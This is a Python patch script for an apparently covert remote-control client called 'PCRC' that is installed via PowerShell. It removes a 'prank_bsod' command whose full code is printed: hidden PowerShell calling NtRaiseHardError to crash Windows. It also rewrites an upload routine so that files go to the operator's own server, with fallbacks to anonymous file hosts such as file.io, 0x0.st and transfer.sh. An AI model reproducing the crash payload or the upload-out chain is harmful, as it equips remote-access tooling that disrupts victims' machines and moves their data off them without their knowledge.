"""
Запусти один раз рядом с client_final.py:
  python patch.py

Применяет три изменения:
  1. Удаляет prank_bsod
  2. В _upload() сначала пробует свой сервер (данные не уходят на сторону)
  3. Исправляет BOM-баг в install.ps1 (если он рядом)
"""

from pathlib import Path
import sys

# ─────────────────────────────────────────────────────────────────────────────
CLIENT = Path("client_final.py")
INSTALL = Path("install.ps1")   # может лежать в другой папке — не страшно

def patch(src: str, old: str, new: str, label: str) -> str:
    if old not in src:
        print(f"  SKIP (already applied or not found): {label}")
        return src
    result = src.replace(old, new, 1)
    print(f"  OK: {label}")
    return result

# ─────────────────────────────────────────────────────────────────────────────
# PATCH 1 — prank_bsod: remove function
# ─────────────────────────────────────────────────────────────────────────────
OLD_BSOD_FN = '''async def cmd_prank_bsod(p):
    if not IS_WIN: return "Windows only"
    script = r"""Add-Type -TypeDefinition @"
using System;using System.Runtime.InteropServices;
public class B{[DllImport("ntdll.dll")]public static extern uint RtlAdjustPrivilege(int p,bool e,bool t,ref bool prev);[DllImport("ntdll.dll")]public static extern uint NtRaiseHardError(uint ec,uint n,uint u,IntPtr p,uint f,ref uint r);public static void Go(){bool prev=false;uint r=0;RtlAdjustPrivilege(19,true,false,ref prev);NtRaiseHardError(0xc0000022,0,0,IntPtr.Zero,6,ref r);}}
"@
[B]::Go()"""
    subprocess.Popen(["powershell","-NoProfile","-WindowStyle","Hidden","-Command",script])
    return "BSOD initiated"

'''
NEW_BSOD_FN = ""  # just delete it

# ─────────────────────────────────────────────────────────────────────────────
# PATCH 2 — prank_bsod: remove from COMMANDS dict
# ─────────────────────────────────────────────────────────────────────────────
OLD_BSOD_CMD = '    "prank_bsod":        cmd_prank_bsod,\n'
NEW_BSOD_CMD = ""

# ─────────────────────────────────────────────────────────────────────────────
# PATCH 3 — prank_bsod: remove from help text
# ─────────────────────────────────────────────────────────────────────────────
OLD_HELP = "PRANKS      : prank_update, prank_bsod"
NEW_HELP = "PRANKS      : prank_update"

# ─────────────────────────────────────────────────────────────────────────────
# PATCH 4 — _upload: try own server first, fall back to third-party
# ─────────────────────────────────────────────────────────────────────────────
OLD_UPLOAD = '''def _upload(file_data: bytes, filename: str = "file.bin") -> str:
    # Method 1 — file.io
    try:
        r = requests.post("https://file.io/?expires=1d",
                          files={"file": (filename, file_data)}, timeout=30)
        if r.status_code == 200:
            d = r.json()
            if d.get("success"):
                return d["link"]
    except Exception as e:
        log.debug(f"file.io: {e}")
    # Method 2 — 0x0.st
    try:
        r = requests.post("https://0x0.st",
                          files={"file": (filename, file_data)}, timeout=30)
        if r.status_code == 200 and r.text.strip().startswith("http"):
            return r.text.strip()
    except Exception as e:
        log.debug(f"0x0.st: {e}")
    # Method 3 — transfer.sh
    try:
        r = requests.put(
            f"https://transfer.sh/{filename}",
            data=file_data,
            headers={"Max-Downloads": "10", "Max-Days": "1"},
            timeout=30,
        )
        if r.status_code == 200 and r.text.strip().startswith("http"):
            return r.text.strip()
    except Exception as e:
        log.debug(f"transfer.sh: {e}")
    raise RuntimeError("All upload methods failed")'''

NEW_UPLOAD = '''def _upload(file_data: bytes, filename: str = "file.bin") -> str:
    """
    Upload a file and return a download URL.
    Priority: own PCRC server (/upload endpoint, data stays on your infra)
    → fallback to anonymous third-party hosts only when the server is unreachable.
    The /upload endpoint on the server auto-deletes files after the first
    download or after 15 minutes, whichever comes first.
    """
    # Method 1 — own server (preferred: no data leaves your infrastructure)
    try:
        base = (CFG.get("server_url") or "").strip().rstrip("/")
        if base.startswith("wss://"):
            base = "https://" + base[6:]
        elif base.startswith("ws://"):
            base = "http://" + base[5:]
        if base.endswith("/ws"):
            base = base[:-3]
        if base:
            r = requests.post(
                f"{base}/upload",
                files={"file": (filename, file_data)},
                headers={"X-Secret": CFG.get("secret_key", "")},
                timeout=30,
            )
            if r.status_code == 200:
                url = r.json().get("url", "")
                if url:
                    log.debug(f"Uploaded via own server: {url}")
                    return url
    except Exception as e:
        log.debug(f"own server upload: {e}")
    # Method 2 — file.io (fallback, third-party)
    try:
        r = requests.post("https://file.io/?expires=1d",
                          files={"file": (filename, file_data)}, timeout=30)
        if r.status_code == 200 and r.json().get("success"):
            return r.json()["link"]
    except Exception as e:
        log.debug(f"file.io: {e}")
    # Method 3 — 0x0.st
    try:
        r = requests.post("https://0x0.st",
                          files={"file": (filename, file_data)}, timeout=30)
        if r.status_code == 200 and r.text.strip().startswith("http"):
            return r.text.strip()
    except Exception as e:
        log.debug(f"0x0.st: {e}")
    # Method 4 — transfer.sh (last resort)
    try:
        r = requests.put(
            f"https://transfer.sh/{filename}",
            data=file_data,
            headers={"Max-Downloads": "10", "Max-Days": "1"},
            timeout=30,
        )
        if r.status_code == 200 and r.text.strip().startswith("http"):
            return r.text.strip()
    except Exception as e:
        log.debug(f"transfer.sh: {e}")
    raise RuntimeError("All upload methods failed")'''

# ─────────────────────────────────────────────────────────────────────────────
# Apply to client_final.py
# ─────────────────────────────────────────────────────────────────────────────
if not CLIENT.exists():
    print(f"ERROR: {CLIENT} not found — run this script from the pcrc-client folder")
    sys.exit(1)

src = CLIENT.read_text(encoding="utf-8")
print(f"\nPatching {CLIENT} ({len(src)} chars)...")
src = patch(src, OLD_BSOD_FN,  NEW_BSOD_FN,  "remove prank_bsod function")
src = patch(src, OLD_BSOD_CMD, NEW_BSOD_CMD, "remove prank_bsod from COMMANDS")
src = patch(src, OLD_HELP,     NEW_HELP,     "remove prank_bsod from help")
src = patch(src, OLD_UPLOAD,   NEW_UPLOAD,   "add own-server upload (priority 1)")
CLIENT.write_text(src, encoding="utf-8")
print(f"Saved {CLIENT}\n")

# ─────────────────────────────────────────────────────────────────────────────
# Apply BOM fix to install.ps1 (searches current dir and parent)
# ─────────────────────────────────────────────────────────────────────────────
OLD_BOM = '        $configObj | ConvertTo-Json -Depth 5 | Set-Content (Join-Path $InstDir "config.json") -Encoding UTF8'
NEW_BOM = (
    '        $jsonText = $configObj | ConvertTo-Json -Depth 5\n'
    '        # FIX: -Encoding UTF8 adds a BOM; Python json.loads() fails on BOM → dialog reappears\n'
    '        [System.IO.File]::WriteAllText((Join-Path $InstDir "config.json"), $jsonText, (New-Object System.Text.UTF8Encoding($false)))'
)

for install_path in [INSTALL, Path("../remote-server/install.ps1"), Path("install.ps1")]:
    if install_path.exists():
        ps = install_path.read_text(encoding="utf-8")
        print(f"Patching {install_path}...")
        ps2 = patch(ps, OLD_BOM, NEW_BOM, "install.ps1 BOM fix")
        install_path.write_text(ps2, encoding="utf-8")
        print(f"Saved {install_path}\n")
        break
else:
    print("install.ps1 not found in current or parent dir — patch it separately (see patch.py OLD_BOM/NEW_BOM)")

print("All done. Now: git add -A && git commit -m 'remove prank_bsod; own-server upload; install BOM fix' && git push")
